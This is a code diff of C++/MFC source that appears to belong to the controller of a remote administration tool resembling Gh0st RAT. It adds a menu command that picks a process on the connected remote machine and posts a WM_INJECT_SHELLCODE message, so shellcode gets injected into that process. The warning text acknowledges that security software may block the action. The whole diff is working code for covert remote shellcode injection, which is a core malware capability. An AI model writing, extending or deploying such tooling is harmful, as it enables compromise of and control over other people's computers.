@@ -23,6 +23,7 @@ IMPLEMENT_DYNAMIC(CSystemDlg, CDialog)
 CSystemDlg::CSystemDlg(CWnd* pParent, Server* IOCPServer, CONTEXT_OBJECT *ContextObject)
     : DialogBase(CSystemDlg::IDD, pParent, IOCPServer, ContextObject, IDI_SERVICE)
 {
+    m_pParent = pParent;
     m_bHow= m_ContextObject->InDeCompressedBuffer.GetBYTE(0);
 }
 
@@ -50,6 +51,7 @@ BEGIN_MESSAGE_MAP(CSystemDlg, CDialog)
     ON_COMMAND(ID_WLIST_RECOVER, &CSystemDlg::OnWlistRecover)
     ON_COMMAND(ID_WLIST_MAX, &CSystemDlg::OnWlistMax)
     ON_COMMAND(ID_WLIST_MIN, &CSystemDlg::OnWlistMin)
+    ON_COMMAND(ID_PLIST_INJECT, &CSystemDlg::OnPlistInject)
 END_MESSAGE_MAP()
 
 
@@ -453,4 +455,32 @@ void CSystemDlg::OnSize(UINT nType, int cx, int cy)
 
     // 重新设置控件大小
     m_ControlList.MoveWindow(0, 0, cx, cy, TRUE);
+}
+
+
+void CSystemDlg::OnPlistInject()
+{
+	CListCtrl* ListCtrl = NULL;
+	if (m_ControlList.IsWindowVisible())
+		ListCtrl = &m_ControlList;
+	else
+		return;
+
+	if (ListCtrl->GetSelectedCount() != 1) 
+        ::MessageBox(m_hWnd, "只能同时向一个进程进行代码注入!", "提示", MB_ICONINFORMATION);
+
+	if (::MessageBox(m_hWnd, "确定要向目标进程 (仅限64位) 进行代码注入吗?\n此操作可能被安全软件阻止，或导致进程崩溃!", 
+        "警告", MB_YESNO | MB_ICONQUESTION) == IDNO) 
+		return;
+
+	DWORD	dwOffset = 1, dwProcessID = 0;
+	POSITION Pos = ListCtrl->GetFirstSelectedItemPosition();
+	if (Pos) {
+		int	nItem = ListCtrl->GetNextSelectedItem(Pos);
+		auto data = (ItemData*)ListCtrl->GetItemData(nItem);
+		dwProcessID = data->ID;
+		dwOffset += sizeof(DWORD);
+	}
+    ASSERT(m_pParent);
+    m_pParent->PostMessageA(WM_INJECT_SHELLCODE, (WPARAM)new std::string(m_ContextObject->PeerName), dwProcessID);
 }
